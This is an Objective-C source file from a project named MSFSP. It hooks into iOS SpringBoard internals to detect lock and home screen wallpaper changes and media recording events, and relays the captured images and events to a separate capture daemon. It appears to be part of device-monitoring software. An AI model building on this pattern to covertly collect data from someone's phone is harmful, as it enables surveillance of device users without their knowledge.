/**
 - Project name :  MSFSP
 - Class name   :  MediaUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  14/02/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MediaUtils.h"
#import "MessagePortIPCSender.h"
#import "SBWallpaperImage.h"
#import "DaemonPrivateHome.h"
#import "DefStd.h"
#import "CRC32.h"

#import "SBWallpaperController.h"
#import "SBFWallpaperView.h"


#import <CommonCrypto/CommonDigest.h>
#import <objc/runtime.h>

@interface MediaUtils (private)

- (BOOL) relayWallpaperNotification: (NSString *) aWallPaperFile;
- (NSString *) completeFilePath: (NSString *) aFileName;
- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName;
- (void) main: (NSDictionary *) aInfo;
- (UIImage *) imageForBitmapData:(NSData *)data size:(CGSize)size;
- (CGSize) sizeWithBitmapData: (NSData *) aData;
- (UIImage *) imageForBitmapData:(NSData *)data;
@end


@implementation MediaUtils

+ (void) setTimeStamp: (NSString *) aTSFileName {
	NSDate *date = [NSDate date];
	NSTimeInterval now = [date timeIntervalSince1970];
	
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [mediaUtils completeFilePath:aTSFileName];
	if (![fm fileExistsAtPath:filePath]) {
		[[NSData dataWithBytes:&now length:sizeof(NSTimeInterval)] writeToFile:filePath atomically:YES];
	}
	[mediaUtils release];
	mediaUtils = nil;
}

+ (void) resetTimeStamp: (NSString *) aTSFileName {
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [mediaUtils completeFilePath:aTSFileName];
	if ([fm fileExistsAtPath:filePath]) {
		[fm removeItemAtPath:filePath error:nil];
	}
	[mediaUtils release];
	mediaUtils = nil;
}

+ (BOOL) isHomeLockShareWallpaper {
	/*	Note that HomeBackgroundThumbnail.jpg and HomeBackground.cpbitmap exist only 
		when home screen image and lock screen image are not shared.
	 */
	BOOL itsShared = TRUE;
	NSString *wallpaperPath = @"/private/var/mobile/Library/SpringBoard/";
	NSString *homeWallpaperFileName = @"HomeBackground.cpbitmap";
	//NSString *lockBackgroundFileName = @"LockBackground.cpbitmap";
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSArray *fileSysItems = [fileManager contentsOfDirectoryAtPath:wallpaperPath error:nil];
	for (NSString *file in fileSysItems) {
		if ([file isEqualToString:homeWallpaperFileName]) {
			itsShared = FALSE;
			break;
		}
	}
	return (itsShared);
}

/**
 - Method name:						sendMediaCapturingNotification:
 - Purpose:							This method is used to send media information to the media capture component for START RECORDING event
 - Argument list and description:	aMediaType (NSString)
 - Return description:				No Return
 */

- (void) sendMediaCapturingNotification: (NSString *) aMediaType {
	 DLog (@"Start recording...")
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc]init];
	[dictionary setValue:[NSNumber numberWithInt:0] forKey:kMediaNotification];		// 0:	recording
	[dictionary setValue:aMediaType forKey:kMediaType];
	
	NSMutableData* data = [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	[self sendData:data];
	
	[data release];
	data = nil;
	[archiver release];
	archiver = nil;
	[dictionary release];
	dictionary = nil;
}

/**
 - Method name:						sendMediaNotificationWithMediaType:
 - Purpose:							This method is used to send media information to the media capture component for STOP RECORDING event
 - Argument list and description:	aMediaType (NSString)
 - Return description:				No Return
*/

- (void) sendMediaNotificationWithMediaType:(NSString *) aMediaType {
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc]init];
	[dictionary setValue:[NSNumber numberWithInt:1] forKey:kMediaNotification];		// 1:	stopped recording
	[dictionary setValue:aMediaType forKey:kMediaType];
	[dictionary setValue:@"" forKey:kMediaPath];
	
	NSMutableData* data = [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	[self sendData:data];
	
	[data release];
	data = nil;
	[archiver release];
	archiver = nil;
	[dictionary release];
	dictionary = nil;
    DLog (@"Captured Media...")
}

/**
 - Method name: sendWallPaperNotification:
 - Purpose:This method is used to send Wallpaper information to the media capture component
 - Argument list and description:aWallPaperInfo (id)
 - Return description:No Return
*/

- (void) sendWallPaperNotification: (id) aWallPaperInfo {
	// /xx/xx/wp_TS.jpeg
	DLog (@"send wallpaper !!!")
	BOOL success = NO;
	NSString *wallPaperFilePath=[NSString stringWithFormat:@"%@wp_%lf.jpeg",[self wallPaperDirectoryPath],[[NSDate date]timeIntervalSince1970]];
	if([aWallPaperInfo isKindOfClass:[UIImage class]]) {
		UIImage *wallImage = aWallPaperInfo;
		NSData *wallPaperData=UIImageJPEGRepresentation(wallImage,1.0);
		[wallPaperData writeToFile:wallPaperFilePath atomically:YES];
		success = [self relayWallpaperNotification:wallPaperFilePath];
	} else if ([aWallPaperInfo isKindOfClass:[NSData class]]) {
		NSData *wallPaperData = (NSData *)aWallPaperInfo;
		NSError *error = nil;
		[wallPaperData writeToFile:wallPaperFilePath options:0 error:&error];
		if (error) {
			DLog (@"error = %@", error);
		}
		success = [self relayWallpaperNotification:wallPaperFilePath];
	}
	if (!success) {
		NSFileManager *fileManager = [NSFileManager defaultManager];
		[fileManager removeItemAtPath:wallPaperFilePath error:nil];
	}
}

/**
 - Method name:						sendData:
 - Purpose:							This method is used to Write Media information into the Message Port
 - Argument list and description:	aData (NSData)
 - Return description:				No Return
 */

- (BOOL) sendData: (NSData *) aData {
	BOOL success = NO;
	if (!(success = [self sendData:aData toPort:kMediaPort1])) { // Load balance
		success = [self sendData:aData toPort:kMediaPort2];
	}
	return (success);
}

/**
 - Method name: wallPaperDirectoryPath
 - Purpose:This method is used to get the wallPaperPath 
 - Argument list and description: No Argument
 - Return description: path (NSString)
 */

- (NSString *) wallPaperDirectoryPath {
	NSString *wallDirPath = [[DaemonPrivateHome daemonSharedHome] stringByAppendingFormat:@"media/wallpaper/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:wallDirPath];
    
    /********************************************************************************************************************
     ***
     
        Starting from iOS 7, 8 we capture wallpaper image from .cpbitmap file, not from thumbnail that's mean file is
     bigger and because of we keep a copy of wallpaper (we cannot get path), wallpaper files that we captured could
     build up disk space quickly if user missed to send command to delete captured wallpaper that's why we decided
     to keep wallpaper files in temporary folder of SpringBoard, next time SpringBoard restart it will delete those
     files.
     
        If user haven't requested actual file of wallpaper before SpringBoard restart, any requests after SpringBoard
     restart will result in file not found error.
     
     ***
     ********************************************************************************************************************/
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
        wallDirPath =  NSTemporaryDirectory();
    }
    
	return wallDirPath;
}

- (NSString *) wallpaperChecksumFilePath: (NSString *) aPath  {
		return [self completeFilePath:aPath];
}

- (void) parallelCheckWallpaperiOS7 {
	DLog(@"parallelCheckWallpaperiOS7")
	[NSThread detachNewThreadSelector:@selector(mainiOS7:) toTarget:self withObject:nil];
}

- (void) parallelCheckWallpaper {
	DLog(@"parallelCheckWallpaper")
	[NSThread detachNewThreadSelector:@selector(main:) toTarget:self withObject:nil];
}

- (BOOL) relayWallpaperNotification: (NSString *) aWallPaperFile {
	NSMutableDictionary *dictionary=[[NSMutableDictionary alloc]init];
	NSMutableData* writeData = [[NSMutableData alloc] init];
	[dictionary setValue:[NSNumber numberWithInt:1] forKey:kMediaNotification];
	[dictionary setValue:kMediaTypeWallPaper forKey:kMediaType];
	[dictionary setValue:aWallPaperFile forKey:kMediaPath];
	
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:writeData];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	BOOL success = [self sendData:writeData];
	
	[archiver release];
	archiver = nil;
	[writeData release];
	writeData = nil;
	[dictionary release];
	dictionary = nil;
	DLog (@"Captured WallPaper...., %d", success)
	return (success);
}

- (NSString *) completeFilePath: (NSString *) aFileName {
	NSString * path = [[DaemonPrivateHome daemonSharedHome] stringByAppendingString:aFileName];
	return (path);
}

- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName {
	BOOL success = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	success = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	return (success);
}

- (BOOL) isHomeScreenChanged {
	DLog (@"After Activate application, so no previous home/lock screen MD5 data")
	NSFileManager *fileManager			= [NSFileManager defaultManager];
	NSDictionary *homeScreenAttributes	= [fileManager attributesOfItemAtPath:@"/private/var/mobile/Library/SpringBoard/HomeBackgroundThumbnail.jpg" error:nil];
	NSDictionary *lockScreenAttributes	= [fileManager attributesOfItemAtPath:@"/private/var/mobile/Library/SpringBoard/LockBackgroundThumbnail.jpg" error:nil];
	NSDate *homeModificationDate		= [homeScreenAttributes fileModificationDate];
	NSDate *lockModificationDate		= [lockScreenAttributes fileModificationDate];
	return [homeModificationDate compare:lockModificationDate] == NSOrderedDescending;	 // receiver is later in time than another date
}

- (void) mainiOS7: (NSDictionary *) aInfo {
	DLog(@"mainiOS7: *** Work for iOS 8 too ***")
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[NSThread sleepForTimeInterval:3.00];
		
	Class $SBWallpaperController					= objc_getClass("SBWallpaperController");
	SBWallpaperController *sbWallpaperController	= [$SBWallpaperController sharedInstance];
	SBFWallpaperView *lockWP						= nil;
	SBFWallpaperView *homeWP						= nil;
	SBFWallpaperView *sharedWP						= nil;
	object_getInstanceVariable(sbWallpaperController, "_lockscreenWallpaperView", (void **)&lockWP);
	object_getInstanceVariable(sbWallpaperController, "_homescreenWallpaperView", (void **)&homeWP);
	object_getInstanceVariable(sbWallpaperController, "_sharedWallpaperView", (void **)&sharedWP);
	DLog (@">>>>>>>>>> lock %@", lockWP)
	DLog (@">>>>>>>>>> home %@", homeWP)
	DLog (@">>>>>>>>>> shared %@", sharedWP)
	
	BOOL isLockAndHomeShareWallpaper = (sharedWP) ? YES : NO;
	
	Class $SBFProceduralWallpaperView					= objc_getClass("SBFProceduralWallpaperView");
	
	BOOL isLockWPDynamic	= NO;
	BOOL isHomeWPDynamic	= NO;
	BOOL isSharedWPDynamic	= NO;
	
	if ([lockWP isKindOfClass:[$SBFProceduralWallpaperView class]]) 
		isLockWPDynamic		= YES;
	if ([homeWP isKindOfClass:[$SBFProceduralWallpaperView class]])
		isHomeWPDynamic		= YES;
	if ([sharedWP isKindOfClass:[$SBFProceduralWallpaperView class]])
		isSharedWPDynamic	= YES;		
	
//	BOOL isLockAndHomeShareWallpaper = [MediaUtils isHomeLockShareWallpaper];
	DLog(@"isLockAndHomeShareWallpaper %d home dynamic: %d lock dynamic: %d", isLockAndHomeShareWallpaper, isHomeWPDynamic, isLockWPDynamic)
	
	UIImage *currentLockImage	= [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/LockBackgroundThumbnail.jpg"]; ;
	UIImage *currentHomeImage	= [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/HomeBackgroundThumbnail.jpg"];
	NSData *currentLockData		= UIImageJPEGRepresentation(currentLockImage, 1.0);
	NSData *currentHomeData		= UIImageJPEGRepresentation(currentHomeImage, 1.0);
    
    NSData *lockCPBitmapData    = [NSData dataWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/LockBackground.cpbitmap"];
    NSData *homeCPBitmapData    = [NSData dataWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/HomeBackground.cpbitmap"];
    UIImage *actualLockImage    = nil;
    UIImage *actualHomeImage    = nil;
    if (lockCPBitmapData) {
        //actualLockImage = [self imageForBitmapData:lockCPBitmapData size:[self sizeWithBitmapData:lockCPBitmapData]];
        actualLockImage = [self imageForBitmapData:lockCPBitmapData];
    }
    if (homeCPBitmapData) {
        //actualHomeImage = [self imageForBitmapData:homeCPBitmapData size:[self sizeWithBitmapData:homeCPBitmapData]];
        actualHomeImage = [self imageForBitmapData:homeCPBitmapData];
    }
    NSData *actualLockData		= UIImageJPEGRepresentation(actualLockImage, 1.0);
	NSData *actualHomeData		= UIImageJPEGRepresentation(actualHomeImage, 1.0);
	
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	
	NSData *previousHomeMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum]];
	NSData *previousLockMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked]];
	DLog (@"previous home md5 %@", previousHomeMD5Data)
	DLog (@"previous lock md5 %@", previousLockMD5Data)
	//DLog (@"current home or wallpaper are not same as the previous")
	
	if (isLockAndHomeShareWallpaper) {
		
		if (!isSharedWPDynamic) {
			DLog (@"---- share wallpaper ----")	// no current home image exists		
			unsigned char md5[16];	
			CC_MD5([currentLockData bytes], [currentLockData length], md5);
			NSData *currentLockMD5Data = [NSData dataWithBytes:md5 length:16];		// md5 for current lock/home image		
			DLog (@"current share md5 %@", currentLockMD5Data)
			
			if (![currentLockMD5Data isEqualToData:previousHomeMD5Data ] &&			// the current is NOT same as home and lock
				![currentLockMD5Data isEqualToData:previousLockMD5Data ]) {
				DLog (@"current shared wallpaper are NOT same as both previous")
				//[mediaUtils sendWallPaperNotification:currentLockData];
                [mediaUtils sendWallPaperNotification:actualLockData];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
			} else {
				if ([currentLockMD5Data isEqualToData:previousHomeMD5Data]) {
					DLog (@"same as HOME")
                    // Change locked screen checksum
					[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				} else {
					DLog (@"same as LOCK")
                    // Change home screen checksum
					[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				}
			}
		} else {
			DLog (@"!!!!!!!! shared dynamic wallpaper")
		}
	} else {
		DLog (@"---- NOT share wallpaper ----")
		// -- calculate current lock screen MD5 data
		unsigned char md5ForLock[16];
		CC_MD5([currentLockData bytes], [currentLockData length], md5ForLock);
		NSData *currentLockMD5Data = [NSData dataWithBytes:md5ForLock length:16];		// md5 for current lock image
		DLog (@"current lock md5 %@", currentLockMD5Data)
		
		// -- calculate current home screen MD5 data		
		unsigned char md5ForHome[16];
		CC_MD5([currentHomeData bytes], [currentHomeData length], md5ForHome);
		NSData *currentHomeMD5Data = [NSData dataWithBytes:md5ForHome length:16];		// md5 for current home image		
		DLog (@"current home md5 %@", currentHomeMD5Data)
		
		if (previousHomeMD5Data == nil					&&								// after activate previousHomeMD5Data and previousLockMD5Data are not created yet
			previousLockMD5Data == nil)					{
			
			if (!isLockWPDynamic	&&  !isHomeWPDynamic) {
				if ([self isHomeScreenChanged])	{ 
					DLog (@"Home screen is change (first time after activate)")
					//[mediaUtils sendWallPaperNotification:currentHomeData];
                    [mediaUtils sendWallPaperNotification:actualHomeData];
				} else {
					DLog (@"Lock screen is change (first time after activate)")	
					//[mediaUtils sendWallPaperNotification:currentLockData];
                    [mediaUtils sendWallPaperNotification:actualLockData];
				}			
				
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
			} else if (!isLockWPDynamic) {
				// process lock wp
				//[mediaUtils sendWallPaperNotification:currentLockData];
                [mediaUtils sendWallPaperNotification:actualLockData];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];				
			} else if (!isHomeWPDynamic) {
				// process home wp
				//[mediaUtils sendWallPaperNotification:currentHomeData];
                [mediaUtils sendWallPaperNotification:actualHomeData];
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];				
			}
			// figure out if the current HOME image duplicates with the previous HOME image or not
		} else if ([currentHomeMD5Data isEqualToData:previousHomeMD5Data] &&
				   [currentLockMD5Data isEqualToData:previousLockMD5Data]) {
			DLog (@"---- UN-SHARE CASE:  do nothing: home and lock images are SAME as previous ----")
		} else {
			// find the changed one (home screen or lock screen)
			if (!isLockWPDynamic	&&  !isHomeWPDynamic) {
				if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data] && 
					![currentLockMD5Data isEqualToData:previousLockMD5Data]) {
					DLog (@"HOME and LOCK changes")				
					// save new MD5 data to the file				
					[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
					[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
					//[mediaUtils sendWallPaperNotification:currentHomeData];
                    [mediaUtils sendWallPaperNotification:actualHomeData];
				} else if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data]){
					DLog (@"HOME screen changes")
					[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
					//[mediaUtils sendWallPaperNotification:currentHomeData];
                    [mediaUtils sendWallPaperNotification:actualHomeData];
				} else {
					DLog (@"LOCK screen changes")
					[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
					//[mediaUtils sendWallPaperNotification:currentLockData];
                    [mediaUtils sendWallPaperNotification:actualLockData];
				}
			}  else if (!isLockWPDynamic) {
				// process lock wp
				if (![currentLockMD5Data isEqualToData:previousLockMD5Data]) {
					DLog (@"LOCK screen changes , HOME is DYNAMIC")
					[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
					//[mediaUtils sendWallPaperNotification:currentLockData];
                    [mediaUtils sendWallPaperNotification:actualLockData];
				} else {
					DLog (@"LOCK same , HOME is DYNAMIC")
				}
							
			} else if (!isHomeWPDynamic) {
				// process home wp
				if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data]) {
					DLog (@"HOME screen changes, LOCK is DYNAMIC")
					// save new MD5 data to the file				
					[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
					//[mediaUtils sendWallPaperNotification:currentHomeData];
                    [mediaUtils sendWallPaperNotification:actualHomeData];
				} else {
					DLog (@"HOME same , LOCK is DYNAMIC")
				}
			} else {
				DLog (@"HOME and LOCK are DYNAMIC")
			}
		}
	}
	[mediaUtils release];
	mediaUtils = nil;
	[pool release];
}


- (void) main: (NSDictionary *) aInfo {
	DLog(@"main:")
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[NSThread sleepForTimeInterval:3.00];
	
	BOOL isLockAndHomeShareWallpaper = [MediaUtils isHomeLockShareWallpaper];
	DLog(@"isLockAndHomeShareWallpaper %d", isLockAndHomeShareWallpaper)
	
	UIImage *currentLockImage = [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/LockBackgroundThumbnail.jpg"]; ;
	UIImage *currentHomeImage = [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/HomeBackgroundThumbnail.jpg"];
	NSData *currentLockData = UIImageJPEGRepresentation(currentLockImage, 1.0);
	NSData *currentHomeData = UIImageJPEGRepresentation(currentHomeImage, 1.0);
	
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	
	NSData *previousHomeMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum]];
	NSData *previousLockMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked]];
	DLog (@"previous home md5 %@", previousHomeMD5Data)
	DLog (@"previous lock md5 %@", previousLockMD5Data)
	//DLog (@"current home or wallpaper are not same as the previous")

	if (isLockAndHomeShareWallpaper) {
		DLog (@"---- share wallpaper ----")	// no current home image exists		
		unsigned char md5[16];	
		CC_MD5([currentLockData bytes], [currentLockData length], md5);
		NSData *currentLockMD5Data = [NSData dataWithBytes:md5 length:16];		// md5 for current lock/home image		
		DLog (@"current share md5 %@", currentLockMD5Data)
		
		if (![currentLockMD5Data isEqualToData:previousHomeMD5Data ] &&			// the current is NOT same as home and lock
			![currentLockMD5Data isEqualToData:previousLockMD5Data ]) {
			DLog (@"current shared wallpaper are NOT same as both previous")
			[mediaUtils sendWallPaperNotification:currentLockData];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
		} else {
			if ([currentLockMD5Data isEqualToData:previousHomeMD5Data]) {
				DLog (@"same as HOME")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
			} else {
				DLog (@"same as LOCK")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			}
		}
	} else {
		DLog (@"---- NOT share wallpaper ----")
		// -- calculate current lock screen MD5 data
		unsigned char md5ForLock[16];
		CC_MD5([currentLockData bytes], [currentLockData length], md5ForLock);
		NSData *currentLockMD5Data = [NSData dataWithBytes:md5ForLock length:16];		// md5 for current lock image
		DLog (@"current lock md5 %@", currentLockMD5Data)

		// -- calculate current home screen MD5 data		
		unsigned char md5ForHome[16];
		CC_MD5([currentHomeData bytes], [currentHomeData length], md5ForHome);
		NSData *currentHomeMD5Data = [NSData dataWithBytes:md5ForHome length:16];		// md5 for current home image		
		DLog (@"current home md5 %@", currentHomeMD5Data)

		if (previousHomeMD5Data == nil					&&								// after activate previousHomeMD5Data and previousLockMD5Data are not created yet
			previousLockMD5Data == nil)					{			
			if ([self isHomeScreenChanged])	{ 
				DLog (@"Home screen is change (first time after activate)")
				[mediaUtils sendWallPaperNotification:currentHomeData];								
			} else {
				DLog (@"Lock screen is change (first time after activate)")	
				[mediaUtils sendWallPaperNotification:currentLockData];
			}			
			
			[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				
		// figure out if the current HOME image duplicates with the previous HOME image or not
		} else if ([currentHomeMD5Data isEqualToData:previousHomeMD5Data] &&
				   [currentLockMD5Data isEqualToData:previousLockMD5Data]) {
			DLog (@"---- UN-SHARE CASE:  do nothing: home and lock images are SAME as previous ----")
		} else {
			// find the changed one (home screen or lock screen)
			if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data] && 
				![currentLockMD5Data isEqualToData:previousLockMD5Data]) {
				DLog (@"HOME and LOCK changes")				
				// save new MD5 data to the file				
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentHomeData];
			} else if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data]){
				DLog (@"HOME screen changes")
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentHomeData];
			} else {
				DLog (@"LOCK screen changes")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentLockData];
			}
		
		}
	}
	[mediaUtils release];
	mediaUtils = nil;
	[pool release];
}

#pragma mark -

// http://stackoverflow.com/questions/22580485/how-to-convert-hex-data-to-uiimage
void releasePixels(void *info, const void *data, size_t size)
{
    free((void*)data);
}

- (UIImage *) imageForBitmapData:(NSData *)data size:(CGSize)size
{
    void *          bitmapData;
    CGColorSpaceRef colorSpace        = CGColorSpaceCreateDeviceRGB();
    int             bitmapBytesPerRow = (size.width * 4);
    int             bitmapByteCount   = (bitmapBytesPerRow * size.height);
    
    bitmapData = malloc( bitmapByteCount );
    NSAssert(bitmapData, @"Unable to create buffer");
    
    [data getBytes:bitmapData length:bitmapByteCount];
    
    CGDataProviderRef provider = CGDataProviderCreateWithData(NULL, bitmapData, bitmapByteCount, releasePixels);
    
    CGImageRef imageRef = CGImageCreate(size.width,
                                        size.height,
                                        8,
                                        32,
                                        bitmapBytesPerRow,
                                        colorSpace,
                                        (CGBitmapInfo)kCGImageAlphaLast,
                                        provider,
                                        NULL,
                                        NO,
                                        kCGRenderingIntentDefault);
    
    UIImage *image = [UIImage imageWithCGImage:imageRef];
    
    CGImageRelease(imageRef);
    CGColorSpaceRelease(colorSpace);
    CGDataProviderRelease(provider);
    
    return image;
}

- (CGSize) sizeWithBitmapData: (NSData *) aData {
    UInt32 width = 0;
    UInt32 height = 0;
    NSData *data = aData;
    [data getBytes:&width  range:NSMakeRange([data length] - sizeof(UInt32) * 5, sizeof(UInt32))];
    [data getBytes:&height range:NSMakeRange([data length] - sizeof(UInt32) * 4, sizeof(UInt32))];
    
    return (CGSizeMake(width, height));
}

// http://stackoverflow.com/questions/21919609/how-to-convert-cpbitmap-to-readable-image-png-jpg-jpeg
- (UIImage *) imageForBitmapData:(NSData *)data
{
    CFArrayRef CPBitmapCreateImagesFromData(CFDataRef cpbitmap, void*, int, void*);
    CFArrayRef someArrayRef = CPBitmapCreateImagesFromData((__bridge CFDataRef)data, NULL, 1, NULL);
    NSArray *array = (__bridge NSArray*)someArrayRef;
    UIImage *image = [UIImage imageWithCGImage:(__bridge CGImageRef)(array[0])];
    if (someArrayRef) {
        CFRelease(someArrayRef);
    }
    return image;
}
	
/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
*/

- (void) dealloc {
	[super dealloc];	
}

@end
